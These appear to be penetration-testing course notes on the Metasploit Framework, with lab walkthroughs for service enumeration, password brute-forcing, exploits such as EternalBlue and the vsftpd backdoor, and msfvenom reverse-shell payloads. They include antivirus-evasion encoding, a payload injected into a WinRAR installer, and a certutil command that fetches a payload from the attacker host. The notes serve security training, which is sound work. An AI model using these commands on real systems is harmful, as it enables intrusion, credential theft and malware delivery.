# Metasploit Framework

### Introduction

**Definition**

* The Metasploit Framework is an open-source, robust penetration testing and exploitation framework that is used by penetration testers and security researchers worldwide.
* It provides penetration testers with a robust infrastructure required to automate every stage of the penetration testing life cycle.
* It is also used to develop and test exploits and has one of the world's largest database of public, tested exploits.
* MSF is designed to be modular, allowing for new functionality to be implemented with ease.
* It is available on GitHub.

**History**

* Developed by HD Morre in 2003.
* Originally developed in Perl.
* Rewritting in Ruby in 2007.
* Acquired by Rapid7 in 2009.
* Metasploit 5.0 released in 2019.
* Metasploit 6.0 in 2020.

**Editions**

* Metasploit Pro (Commercial)
* Metasploit Express (Commercial)
* Metasploit Framework (Community)

**Terminology**

* **Interface :** methods of interacting with the MSF.
  * **MSFconsole :** it is an easy-to-use all in one interface that provides you with access to all the functionalty of the MSF.
  * **MSFcli :** it is a command line utility that is used to facilitate the creation of automation scripts that utilize Metasploit modules. It can be used to redirect output from other tools in to msfcli and vice versa.
  * **MSFCommunityEdition :** it is a web based GUI front-end for the MSF that simplifies network discovery and vulnerability identification.
  * **Armitage :** it is a free Java based GUI front-end for MSF that simplifies network discovery, exploitation and post exploitation.
* **Module :** pieces of code that perform a particular task, an example of a module is an exploit.
* **Vulnerability :** weakness or flaw in a computer system or network that can be exploited.
* **Exploit :** piece of code/module that is used to take advantage a vulnerability within a system, service or application.
* **Payload :** piece of code delivered to the target system by an exploit with the objective of executing aribtrary commands or providing remote access to an attacker.
* **Listener :** a utility that listens for an incoming connection from a target.

### Architecture

<figure><img src="../../.gitbook/assets/71.png" alt=""><figcaption></figcaption></figure>

* A module in the context of MSF is a piece of code that can be utilized be the MSF.
* The MSF libraries facilitate the execution of modules without having to write the code necessary in order to execute them.

#### Modules

* **Exploit :** a module that is used to take advantage of vulnerability and is typically paired with a payload.
* **Payload :** code that is delivered by MSF and remotely executed on the target after successful exploitation. An example of a payload is a reverse shell that initiates a connection from the target system back to the attacker.
* **Encoder :** used to encode payloads in order to avoid AV detection. For example, `shikata_ga_nai` is used to encode Windows payloads.
* **NOPS :** used to ensure that payloads sizes are consistent and ensure the stability of a payload when executed.
* **Auxiliary :** a module that is used to perform additional functionality like port scanning and enumeration.

#### Payloads

| Type               | Description                                                                                                                                                                                                                            |
| ------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Non-staged payload | It is sent to the target system as is along with the exploit.                                                                                                                                                                          |
| Staged payload     | It is sent to the target in two parts, whereby the first part (**stager**) contains a payload that is used to establish a reverse connection back to the attacker, download the second part of the payload (**stage**) and execute it. |

* **Stager :** it is typically used to establish a stable communication channel between the attacker and target, after which a stage payload is downloaded and executed on the target system.
* **Stage :** payload components that are downloaded by the stager.
* **Meterpreter payload :** it is an advanced multi-functional payload that is executed in memory on the target system making it difficult to detect. It communicates over a stager socket and provides an attacker with an interactive command interpreter on the target system that facilitates the execution of system commands, file system navigation, keylogging and much more.

#### File system structure

* Location
  * System modules : `/usr/share/metasploit-framework/modules`
  * User modules : `~/.ms4/modules`

```bash
# /usr/share/metasploit-framework/modules/
auxiliary/
encoders/
evasion/
exploits/
nops/
payloads/
post/
```

### Pentest with MSF

* The MSF can be used to perform and automate various tasks that fall under the penetration testing life cycle.
* In order to understand how we can leverage the MSF for penetration testing, we need to explore the various phases of a penetration test and their respective techniques and objectives.
* We can adopt the **PTES** (Penetration Testing Execution Standard) as a roadmap to understanding the various phases that make up a penetration test and how Metasploit can be integrated in to each phase. The PTES is a penetration testing methodology that was developed by a team of information security practitioners with the aim of addressing the need for a comprehensive and up-to-date standard for penetration testing. It is available on GitHub on https://github.com/penetration-testing-execution-standard/ptes.

#### Phases

<figure><img src="../../.gitbook/assets/72.png" alt=""><figcaption></figcaption></figure>

| Phase                                 | MSF implementation                     |
| ------------------------------------- | -------------------------------------- |
| Information gathering and enumeration | Auxiliary modules                      |
| Vulnerability scanning                | Auxiliary modules, Nessus              |
| Exploitation                          | Exploit modules and payloads           |
| Post exploitation                     | Meterpreter                            |
| Privilege escalation                  | Post exploitation modules, Meterpreter |
| Maintaining persisten access          | Post exploitation modules, persistence |

### Installation and configuration

* The MSF is distributed by Rapid7 and can be downloaded and installed as a standalone package on both Windows and Linux.
* In this course we will be utilizing the MSF on Kali Linux.
* MSF and its required dependencies come pre-packaged with Kali Linux which saves us from the tedious process of installing MSF manually.

#### Database

* The MSF Database (msfdb) is an integral part of the MSF and is used to keep track of all your assessments, host data scans etc.
* The MSF uses PostgreSQL as the primary database server, as a result, we will also need to ensure that the PostgreSQL database service is running and configured correctly.
* The msfdb also facilitates the importation and storage of scan results from various third party tools like Nmap and Nessus.

#### Steps

1. Update our repo and upgrade our MSF to the latest version.
2. Start and enable the PostgreSQL database service.
3. Initialize the msfdb.
4. Launch MSFconsole.

```bash
john@attack> sudo apt-get update && sudo apt-get install metasploit-framework -y
john@attack> sudo systemctl enable postgresql
john@attack> sudo systemctl start postgresql
john@attack> sudo systemctl status postgresql  # must be active
john@attack> sudo msfdb init
john@attack> msfconsole

msf6> db_status
```

### Fundamentals

#### Modules variables

* MSF modules will typically require information like the target and host IP address and port in order to initiate a remote exploit/connection.
* These options can be configured through the use of MSF variables.
* MSFconsole allows you to set both **local** variable values and **global** variable values.

| Variable | Purpose                                                                                                              |
| -------- | -------------------------------------------------------------------------------------------------------------------- |
| LHOST    | This variable is used to store the IP address of the attacker's system.                                              |
| LPORT    | This variable is used to store the port number on the attacker's sytem that be used to receive a reverse connection. |
| RHOST    | This variable is used to store the IP address of the target system/server.                                           |
| RHOSTS   | This variable is used to specify the IP addresses of multiple target systems or network ranges.                      |
| RPORT    | This variable stores the port number that we are targeting on the target system.                                     |

#### Commands

```
msf6> help
```

**Groups**

* Core commands
* Module commands
* Job commands
* Resource script commands
* Database backend commands
* Credentials backend commands
* Developer commands

| Command                                          | Description                                                         |
| ------------------------------------------------ | ------------------------------------------------------------------- |
| `version`                                        | The MSFconsole version.                                             |
| `show all`                                       | All available modules.                                              |
| `show exploits`                                  | All available exploits.                                             |
| `show -h`                                        | Help menu for the command `show`.                                   |
| `search portscan`                                | List scan port modules.                                             |
| `use auxiliary/scanner/portscan/tcp`             | Use the module.                                                     |
| `show options`                                   | Display the current module options.                                 |
| `set RHOSTS 192.168.2.1`                         | Set the variable `RHOSTS`.                                          |
| `setg RHOSTS 192.168.2.1`                        | Set the **global** variable `RHOSTS`.                               |
| `set PORTS 1-1000`                               | Set the variable `PORTS`.                                           |
| `run`                                            | Execute the module.                                                 |
| `search cve:2017 type:exploit platform:-windows` | Search all CVEs from `2017` as `exploit` on the platform `windows`. |
| `search eternalblue`                             | Search all `eternalblue` modules.                                   |
| `use 0`                                          | Select the first module of the result list.                         |
| `sessions`                                       | List all of the active sessions.                                    |
| `connect 192.168.2.1 80`                         | Similar to netcat, it displays the banner.                          |
| `creds`                                          | Show credentials.                                                   |
| `loot`                                           | Download the database in a file.                                    |
| `info`                                           | Show information about module.                                      |
| `notes`                                          | Show notes.                                                         |

In the options, there are the **Module options**, the **Payload options**, the **Exploit target**, etc.

### Workspaces

* Workspaces allow you to keep track of all your hosts, scans and activities and are extemely useful when conducting penetration tests as they allow you to sort and organize your data based on the target or organization.
* MSFconsole provides you with the ability to create, manage and switch between workspaces depending on your requirements.
* We will be using workspaces to organize our assessments as we progress through the course.

| Command                     | Description                                                    |
| --------------------------- | -------------------------------------------------------------- |
| `workspace -h`              | Help menu of the `workspace` command.                          |
| `workspace`                 | List the workspaces.                                           |
| `hosts`                     | List of workspace hosts.                                       |
| `workspace -a Test`         | Create a new workspace `Test` and switch to the new workspace. |
| `workspace default`         | Switch to default workspace.                                   |
| `workspace -r Test NewTest` | Rename the workspace `Test` into `NewTest`.                    |
| `workspace -d Test`         | Delete the workspace `Test`.                                   |

### Nmap

* We can output the results of our Nmap scan in to a format that can be imported into MSF for vulnerability detection and exploitation.

#### Import file into MSF

```bash
john@attack> nmap 10.3.23.41 -Pn -sV -O -oX windows_server_2012
john@attack> service postgresql start && msfconsole

msf5> workspace -a win2012
msf5> db_import /root/windows_server_2012
msf5> hosts
msf5> services
```

<figure><img src="../../.gitbook/assets/73.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/74.png" alt=""><figcaption></figcaption></figure>

#### MSF built-in Nmap

```
msf5> workspace -a nmap_msf
msf5> db_nmap -Pn -sV -O 10.3.29.233
msf5> hosts
msf5> vulns
```

### Port scanning with auxiliary

#### Description

* Auxiliary modules are used to perform functionality like scanning, discovery and fuzzing.
* We can use auxiliary modules to perform both TCP and UDP port scanning as well as enumerating information from services like FTP, SSH, HTTP etc.
* Auxiliary modules can be used during the information gathering phase of a penetration test as well as the post exploitation phase.
* We can also use auxiliary modules to discover hosts and perform port scanning on a different network subnet after we have obtained initial access on a target system.

#### Lab infrastucture

* Our objective is to utilize auxiliary modules to discover open ports on our first target.
* The next step will involve exploiting the service running on the target in order to obtain a foothold.
* We will then utilize our foothold to access other systems on a different network subnet (pivoting).
* We will then utilize auxiliary modules to scan for open ports on the second target.

```bash
root@attackdefense> service postgresql start && msfconsole

msf5> db_status
msf5> workspace -a port_scan
msf5> search portscan
msf5> use auxiliary/scanner/portscan/tcp
msf5> set rhosts 192.8.146.3
msf5> run
```

The port `192.8.146.3:80` is open.

```
msf5> curl 192.8.146.3
msf5> search xoda
msf5> use exploit/unix/webapp/xoda_file_upload
msf5> set rhosts 192.8.146.3
msf5> set targeturi /
msf5> run

meterpreter> sysinfo
meterpreter> shell
/bin/bash -i

www-data@victim-1> ifconfig
```

The target has two interfaces : `192.8.146.3` and `192.81.84.2`.

```
meterpreter> run autoroute -s 192.81.84.2

Ctrl+Z for background

msf5> sessions
```

You must have a session.

```
msf5> use auxiliary/scanner/portscan/tcp
msf5> set rhosts 192.81.84.3
msf5> run
```

The ports open on `192.81.84.3` are `21` `22` `80`.

### FTP enumeration

* We can use multiple auxiliary modules to enumerate information as well as perform brute-force attacks on the target running an FTP server.

```
john@attack> service postgresql start && msfconsole

msf5> workspace -a ftp_enum
msf5> use auxiliary/scanner/portscan/tcp
msf5> set rhosts 192.7.200.3
```

The port `192.7.200.3:21` is open.

```
msf5> search type:auxiliary name:ftp
msf5> use auxiliary/scanner/ftp/ftp_version
msf5> set rhosts 192.7.200.3
msf5> run
```

<figure><img src="../../.gitbook/assets/75.png" alt=""><figcaption></figcaption></figure>

```
msf5> use auxiliary/scanner/ftp/ftp_login
msf5> set rhosts 192.7.200.3
msf5> set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5> set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5> run
```

The FTP credentials are `sysadmin:654321`.

```bash
root@attackdefense> ftp 192.7.200.3  # sysadmin:654321

ftp> get secret.txt
ftp> bye

root@attackdefense> cat secret.txt
```

### SMB enumeration

* We can utilize auxiliary modules to enumerate the SMB version, shares, users and perform a brute-force attack in order to identify users and passwords.

```
root@attackdefense> service postgresql start && msfconsole

msf5> workspace -a smb_enum
msf5> setg rhosts 192.64.76.3
msf5> search type:auxiliary name:smb
msf5> use auxiliary/scanner/smb/smb_version
msf5> run
```

<figure><img src="../../.gitbook/assets/76.png" alt=""><figcaption></figcaption></figure>

```
msf5> use auxiliary/scanner/smb/smb_enumusers
msf5> run
```

<figure><img src="../../.gitbook/assets/77.png" alt=""><figcaption></figcaption></figure>

The users are `john` `elie` `aisha` `shawn` `emma` `admin`.

```
msf5> use auxiliary/scanner/smb/smb_enumshares
msf5> set showfiles true
msf5> run
```

<figure><img src="../../.gitbook/assets/78.png" alt=""><figcaption></figcaption></figure>

```
msf5> use auxiliary/scanner/smb/smb_login
msf5> set smbuser admin
msf5> set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5> run
```

The credentials are `admin:password`.

```
root@attackdefense> smbclient -L \\\\192.64.76.3\\ -U admin
```

<figure><img src="../../.gitbook/assets/80.png" alt=""><figcaption></figcaption></figure>

```
root@attackdefense> smbclient \\\\192.64.76.3\\public -U admin

smb> cd secret
smb> get flag
smb> exit

root@attackdefense> cat flag
```

### Web server enumeration

* A web server is software that is used to serve webiste data on the web.
* Web servers utilize HTTP to facilitate the communication between clients and the web server.
* HTTP is an application layer protocol that utilizes TCP port 80 for communication.
* We can utilize auxiliary modules to enumerate the web server version, HTTP headers, brute-force directories and much more.
* Examples of popular web servers are Apache, Nginx and Microsoft IIS.

```
root@attackdefense> service postgresql start && msfconsole

msf5> workspace -a web_enum
msf5> setg rhosts 192.227.166.3
msf5> search type:auxiliary name:http
msf5> use auxiliary/scanner/http/http_version
msf5> run
```

<figure><img src="../../.gitbook/assets/81.png" alt=""><figcaption></figcaption></figure>

```
msf5> use auxiliary/scanner/http/http_header
```

<figure><img src="../../.gitbook/assets/82.png" alt=""><figcaption></figcaption></figure>

```bash
msf5> use auxiliary/scanner/http/robots_txt
```

<figure><img src="../../.gitbook/assets/83.png" alt=""><figcaption></figcaption></figure>

```bash
msf5> curl http://192.227.166.3/data/
msf5> curl http://192.227.166.3/secure/

msf5> use auxiliary/scanner/http/dir_scanner
msf5> run
```

<figure><img src="../../.gitbook/assets/84.png" alt=""><figcaption></figcaption></figure>

```
msf5> use auxiliary/scanner/http/files_dir
msf5> run
```

<figure><img src="../../.gitbook/assets/85.png" alt=""><figcaption></figcaption></figure>

```
msf5> use auxiliary/scanner/http/apache_userdir_enum
msf5> set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5> set verbose false
msf5> run
```

<figure><img src="../../.gitbook/assets/86.png" alt=""><figcaption></figcaption></figure>

The user is `rooty`.

```
msf5> use auxiliary/scanner/http/http_login
msf5> set auth_uri /secure/
msf5> unset USERPASS_FILE
msf5> set user_file /usr/share/metasploit-framework/data/wordlists/namelist.txt
msf5> set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5> set verbose false
msf5> run
```

### MySQL enumeration

* MySQL is an open-source relational database management system based on SQL (Structured Query Language).
* It is typically used to store records, customer data, and is most commonly deployed to store web application data.
* MySQL utilizes TCP port 3306 by default, however, like any service it can be hosted on any open TCP port.
* We can utilize auxiliary modules to enumerate the version of MySQL, perform brute-force attacks to identify passwords, execute SQL queries and much more.

```
root@attackdefense> system postgresql start && msfconsole

msf5> workspace -a mysql_enum
msf5> setg rhosts 192.35.65.3
msf5> search type:auxiliary name:mysql
msf5> run
```

<figure><img src="../../.gitbook/assets/87.png" alt=""><figcaption></figcaption></figure>

```
msf5> use auxiliary/scanner/mysql/mysql_login
msf5> set username root
msf5> set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5> set stop_on_success true
msf5> run
```

<figure><img src="../../.gitbook/assets/88.png" alt=""><figcaption></figcaption></figure>

```
msf5> use auxiliary/admin/mysql/mysql_enum
msf5> setg username root
msf5> setg password twinkle
```

<figure><img src="../../.gitbook/assets/89.png" alt=""><figcaption></figcaption></figure>

```
msf5> use auxiliary/admin/mysql/mysql_sql
msf5> set sql 'show database;'
msf5> run
```

<figure><img src="../../.gitbook/assets/90.png" alt=""><figcaption></figcaption></figure>

```
msf5> use auxiliary/scanner/mysql/mysql_schemadump
msf5> run
```

<figure><img src="../../.gitbook/assets/91.png" alt=""><figcaption></figcaption></figure>

### SSH enumeration

* SSH (Secure Shell) is a remote administration protocol that offers enryption and is the successor to Telnet.
* It is typically used for remote access to servers and systems.
* SSH uses TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port.
* We can utilize auxiliary modules to enumerate the version of SSH running on the target as well as perform brute-force attacks to identify passwords that can consequently provide us access to a target.

```
root@attackdefense> service postgresql start && msfconsole
msf5> workspace -a ssh_enum
msf5> setg rhosts 192.145.151.3
msf5> search type:auxiliary name:ssh
msf5> use auxiliary/scanner/ssh/ssh_version
msf5> run
```

<figure><img src="../../.gitbook/assets/92.png" alt=""><figcaption></figcaption></figure>

```
msf5> use auxiliary/scanner/ssh/ssh_login
msf5> set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5> set pass_file /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
msf5> run

Ctrl+c

msf5> sessions 1
/bin/bash -i
sysadmin@victim-1> id
```

<figure><img src="../../.gitbook/assets/93.png" alt=""><figcaption></figcaption></figure>

```
msf5> use auxiliary/scanner/ssh/ssh_enumusers
msf5> set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5> run
```

<figure><img src="../../.gitbook/assets/94.png" alt=""><figcaption></figcaption></figure>

### SMTP enumeration

* SMTP (Simple Mail Transfer Protocol) is a communication protocol that is used for the transmission of email.
* SMTP uses TCP port 25 by default. It can also be configured to run on TCP port 465 and 587.
* We can utilize auxiliary modules to enumerate the version of SMTP as well as user accounts on the target system.

```
root@attackdefense> service postgresql start && msfconsole
msf5> workspace -a smtp_enum
msf5> setg rhosts 192.104.30.3
msf5> use auxiliary/scanner/smtp/smtp_version
msf5> run
```

<figure><img src="../../.gitbook/assets/95.png" alt=""><figcaption></figcaption></figure>

```
msf5> use auxiliary/scanner/smtp/smtp_enum
msf5> run
```

<figure><img src="../../.gitbook/assets/96.png" alt=""><figcaption></figcaption></figure>

### Vulnerability scanning

#### Definition

* Vulnerability scanning & detection is the process of scanning a target for vulnerabilities and verifying whether they can be exploited.
* So far, we have been able to identify and exploit misconfigurations on target systems, however, in this section we will be exploring the process of utilizing auxiliary and exploit modules to scan and identify inherent vulnerabilities in services, operating systems and web applications.
* This information will come in handy during the exploitation phase of this course.
* We will also be exploring the process of utilizing third party vulnerability scanning tools like Nessus and how we can integrate Nessus functionality in to the MSF.

#### Demo

**First method**

```bash
kali@kali> nmap -sn 10.10.10.1/24
kali@kali> service postgresql start && msfconsole

msf6> db_status
msf6> workspace -a vuln-scanning
msf6> setg rhosts 10.10.10.4
msf6> setg rhost 10.10.10.4

msf6> db_nmap 10.10.10.4 -sS -sV
msf6> search type:exploit name:iis
msf6> search type:exploit name:mysql
msf6> search Sun Glassfish
msf6> use exploit/mult/http/glassfish_deployer

msf6> info
msf6> set payload windows/meterpreter/reverse_tcp
msf6> options
msf6> back  # unusable service

msf6> searchsploit 'Microsoft Windows SMB' | grep Metasploit
msf6> search eternalblue
msf6> use auxiliary/scanner/smb/smb_ms17_010
msf6> run  # the service is vulnerable

msf6> use windows/smb/ms17_10_eternalblue
msf6> run

meterpreter> sysinfo  # reverse shell
```

**Second method**

```bash
kali@kali> wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
kali@kali> cp db_autopwn.rb /usr/share/metasploit-framework/plugins
kali@kali> msfconsole

msf6> load db_autopwn
msf6> db_autopwn -p -t -PI 445
msf6> db_autopwn -p -t -PI 21
```

**Third method**

```bash
msf6> analyze
msf6> vulns
```

### Nessus Vulnerability Scan

#### Definition

* Nessus is a proprietary scanner developed by Tenable.
* We can utilize Nessus to perform a vulnerability scan on a target system, after which, we can import the Nessus results in to MSF analysis and exploitation.
* Nessus automates the process of identifying vulnerabilities and also provides us with information pertinent to a vulnerability liek the CVE code.
* We can use the free version of Nessus, which allows us to scan upto 16 IPs.

```bash
msf6> workspace -a nessus-scan
msf6> db_import /home/kali/Downloads/MS3_fkthis.nessus
msf6> hosts
msf6> services
msf6> vulns                    # a lot of vulnerabilities
msf6> vulns -p 445             # filter vulnerabilities
msf6> search cve:2017 name:smb # 1st search way 
msf6> search MS12-020          # 2nd search way
msf6> search cve:2015 name:ManageEngine

msf6> use windows/http/manageengine_connectionid_write
msf6> set rhosts 10.10.10.4
msf6> run

meterpreter> sysinfo
```

### WMAP

#### Definition

* WMAP is web application vulnerability scanner that can be sued to automate web server enumeration and scan web applications for vulnerabilities.
* WMAP is available as an MSF plugin and can be loaded directly into MSF.
* WMAP is fully integrated with MSF, which consequently allows us to preform web app vulnerability scanning from within the MSF.

#### Lab

```bash
root@attackdefense> ifconfig
root@attackdefense> service postgresql start && msfconsole

msf6> workspace -a wmap-scan
msf6> setg rhosts 192.31.11.3
msf6> load wmap
msf6> wmap_sites -a 192.31.11.3
msf6> wmap_sites -l      # list sites
msf6> wmap_targets -d http://192.31.11.3/
msf6> wmap_targets -t 1  # the site index
msf6> wmap_targets -l    # list targets

msf6> wmap_run -t
```

<figure><img src="../../.gitbook/assets/97.png" alt=""><figcaption></figcaption></figure>

```bash
msf6> wmap_run -e
```

<figure><img src="../../.gitbook/assets/98.png" alt=""><figcaption></figcaption></figure>

```bash
msf6> use auxiliary/scanner/http/http_put
msf6> set path /data/
msf6> run
```

<figure><img src="../../.gitbook/assets/99.png" alt=""><figcaption></figcaption></figure>

### Client-side attacks

* A client-side attack is an attack vector that involves coercing a client to execute a malicious payload on their system that consequently connects back to the attacker when executed.
* Client-side attacks typically utilize various social engineering techniques like generating malicious documents or portable executables (PEs).
* Client-side attacks take advantage of humain vulnerabilities as opposed to vulnerabilities in services or software running on the target system.
* Given that this attack vector involves the transfer and storage of a malicious payload on the client's system (disk), attackers need to be cognisant of AV detection.

### MSFvenom

#### Definition

* MSFvenom is a command line utility that can be used to generate and encode MSF payloads for various operating systems as well as web servers.
* MSFvenom is a combination of two utilities, namely MSFpayload and MSFencode.
* We can use MSFvenom to generate a malicious meterpreter payload that can be transferred to a client target system. Once executed, it will connect back to our payload handler and provide us with remote access to the target system.

The payload syntax is `platform`/`architecture`/`type`/`protocol`. Example : `windows/x64/meterpreter/reverse_tcp`.

```bash
kali@kali> msfvenom --list payloads
kali@kali> msfvenom --list formats
```

* Staged payload : you specifiy the payload type, `windows/x64/meterpreter/reverse_tcp`.
* Non-staged payload : there are only 2 backslashes, `windows/x64/meterpreter_reverse_tcp`.

#### Windows payloads

```bash
kali@kali> msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe -o payloadx86.exe
kali@kali> msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe -o payloadx64.exe
```

#### Linux payloads

```bash
kali@kali> msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.10.10.5 lport=1234 -f elf -o payloadx86.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.10.10.5 lport=1234 -f elf -o payloadx64.elf
```

#### Payload encoding

* Given that this attack vector involves the transfer and storage of a malicious payload on the client's system (disk), attackers need to be cognisant of **AV detection**.
* Most of end user AV solutions utilize signature based detection in order to identify malicious files or executables.
* We can evade older signature based AV solutions be encoding our payloads.
* Encoding is the process of modifying the payload shellcode with the objective of **modifying the payload signature**.
* **Shellcode** (shell-code) is a piece of code typically used as a payload for exploitation.
* It gets its name from the term command shell, whereby shellcode is **a piece of code** that provides an attacker with a remote command shell on the target system.

```bash
# windows - 10 encoding iterations - shikata_ga_nai encoder
kali@kali> msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.5 lport=1234 -i 10 -e x86/shikata_ga_nai -f exe -o encodedx86.exe
kali@kali> msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.10.10.5 lport=1234 -e x86/shikata_ga_nai -i 10 -f elf -o encodedx86
```

#### Windows portable executable payload injection

A great Windows tool is **Winrar** and you can inject shellcode into this executable. First download the executable configuration file https://www.win-rar.com/.

```bash
kali@kali> msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.81.62 lport=1234 -e x86/shikata_ga_nai -i 10 -f exe -x Downloads/winrar-x32-622.exe -o winrar.exe

kali@kali> msfconsole
msf6> use multi/handler
msf6> set payload windows/meterpreter/reverse_tcp
msf6> set lhost 192.168.81.62
msf6> set lport 1234
msf6> run

meterpreter> run post/windows/manage/migrate  # post-exploitation module
```

Then you can execute the `winrar.exe` on the Windows system and you gain meterpreter on the kali attacker.

### Resource scripts MSF automation

* MSF resource scripts are a feature that allow you to automate repetitive tasks and commands.
* They operate similarly to batch scripts, whereby, you can specify a set of MSFconsole commands that you want to execute sequentially.
* You can load the script with MSFconsole and automate the execution of the commands you specified in the resource script.
* We can use resource scripts to automate various tasks like setting up multi handlers as well as loading and executing payloads.

**Script 1**

```bash
kali@kali> ls -la /usr/share/metasploit-framework/scripts/resources/
kali@kali> vim handler.rc
```

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.10.5
set lport 1234
run
```

```bash
kali@kali> msfconsole -r handler.rc  # not in msfconsole yet
msf6> resource handler.rc            # already using msfconsole
msf6> makerc saved_commands.rc       # save previous commands
```

**Script 2**

```bash
kali@kali> portscan.rc
```

```
use auxiliary/scanner/portscan/tcp
set rhosts 10.10.10.7
run
```

```bash
kali@kali> msfconsole -r portscan.rc
```

### Windows : HTTP File Server

* An HTTP File Server (HFS) is a web server that is designed for file & document sharing.
* HFS typically run on TCP port 80 and utilize the HTTP protocol for underlying communication
* Rejetto HFS is a popular free and open source HFS that can be setup on both Windows and Linux.
* Rejetto HFS V2.3 is vulnerable to a RCE attack.
* MSF has an exploit module that we can utilize to gain access to the target system hosting the HFS.

```bash
kali@kali> service postgresql start && msfconsole

msf6> setg rhosts 10.3.27.4
msf6> db_nmap -sS -sV -O 10.3.27.4
msf6> search type:exploit name:rejetto
msf6> use 0
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> set lhost 10.10.9.2
msf6> run

meterpreter> sysinfo
```

### Windows : MS17-010 SMB (EternalBlue)

```bash
kali@kali> service postgresql start && msfconsole

msf6> workspace -a eternalblue
msf6> db_nmap -sS -sV -O 10.10.10.7
msf6> services

msf6> search type:auxiliary EternalBlue
msf6> use auxiliary/scanner/smb/smb_ms17_010
msf6> set rhosts 10.10.10.7
msf6> run

msf6> search type:exploit EternalBlue
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> set rhosts 10.10.10.7
msf6> run

meterpreter> sysinfo
```

### Windows : WinRM

```bash
kali@kali> service postgresql start && msfconsole

msf6> workspace -a winrm
msf6> db_nmap -sS -sV -O 10.3.28.17
msf6> services

msf6> search type:auxiliary name:winrm
msf6> use auxiliary/scanner/winrm/winrm_auth_methods
msf6> run

msf6> use auxiliary/winrm/winrm_login
msf6> set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf6> set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt

msf6> use auxiliary/scanner/winrm/winrm_cmd
msf6> set username administrator
msf6> set password tinkerbell
msf6> set cmd whoami
msf6> run

msf6> use exploit/windows/winrm/winrm_script_exec
msf6> set password tinkerbell
msf6> set username administrator
msf6> set force_vbs true
msf6> run

meterpreter> sysinfo
```

### Windows : Apache Tomcat

#### Definition

* Also known as Tomcat server, is a popular, free and open source Java servlet web server.
* It is used to build and host dynamic websites and web applications based on the Java software platform.
* Apache Tomcat utilize the HTTP protocol to facilitate the underlying communication between the server and clients.
* It runs on TCP port 8080 by default.
* The standard Apache HTTP web server is used to host static and dynamic websites or web applications, typically developed in PHP.
* The Apache Tomcat web server is primarily used to host dynamic websites or web applications developed in Java.
* **Apache Tomcat V8.5.19** is vulnerable to a remote code execute vulnerability that could potentially allow an attacker to upload and execute a JSP (Java Service Page) payload in order to gain remote access to the target server.
* We can utilize a prebuilt MSF exploit module to exploit this vulnerability and consequently gain access to the target server.

```bash
kali@kali> service postgresql start && msfconsole

msf6> workspace -a tomcat
msf6> services
msf6> search type:exploit name:tomcat_jsp

msf6> use multi/http/tomcat_jsp_upload_bypass
msf6> set payload java/jsp_shell_bind_tcp
msf6> set shell cmd
msf6> run
```

Transfer a meterpreter payload.

```bash
kali@kali> msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.9.2 lport=1234 -f exe -o meterpreter.exe
kali@kali> python3 -m http.server 80
```

```bash
C:\Temp> certutil -urlcache -f http://10.10.9.2/meterpreter.exe meterpreter.exe
```

Create a MSF script.

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.9.2
set lport 1234
run
```

Execute the `meterpreter.exe` on the target.

### Linux : FTP

* It is frequently used as a means of transferring files to and from the directory of a web server.
* vsftpd is an FTP server for Unix-like systems including Linux systems and is the default FTP server for Ubuntu, CentOS and Fedora.
* **vsftpd V2.3.4** is vulnerable to a command execution vulnerability that is facilitated by a malicious backdoor that was added to the vsftpd download archive through a supply chain attack.

```bash
kali@kali> service postgresql start && msfconsole
msf6> workspace -a ftp
msf6> setg rhosts 192.195.12.3
msf6> db_nmap -sS -sV -O 192.195.12.3

msf6> use exploit/unix/ftp/vsftpd_234_backdoor
msf6> run

/bin/bash -i
root@victim-1> id

# Ctrl+Z to background the session
```

Upgrade shell to meterpreter.

```bash
msf6> use multi/manage/shell_to_meterpreter
msf6> set lhost eth1
msf6> set session 1
msf6> run
```

Go to the new session.

```bash
msf6> sessions 2
meterpreter> sysinfo
```

### Linux : Samba

* SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a LAN.
* SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139.
* Samba is the Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.
* **Samba V3.5.0** is vulnerable to a RCE vulnerability, allowing a malicious client to upload a shared library to a writable share, and then cause the server to load and execute it.

```bash
kali@kali> service postgresql start && msfconsole
msf6> workspace -a samba
msf6> db_nmap -sS -sV -O 192.182.79.3

msf6> search type:exploit name:samba
msf6> use exploit/linux/samba/is_known_pipename
msf6> check
msf6> run

# Ctrl+Z
```

Upgrade shell to meterpreter.

```bash
msf6> search shell_to_meterpreter
msf6> use shell/multi/manager/shell_to_meterpreter
msf6> set lhost eth1
msf6> run

meterpreter> sysinfo
```

### Linux : SSH

* SSH (Secure Shell) is a remote administration protocol that offers encryption and is the successor to Telnet.
* It is typically used for remote access to servers and systems.
* SSH uses TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port.
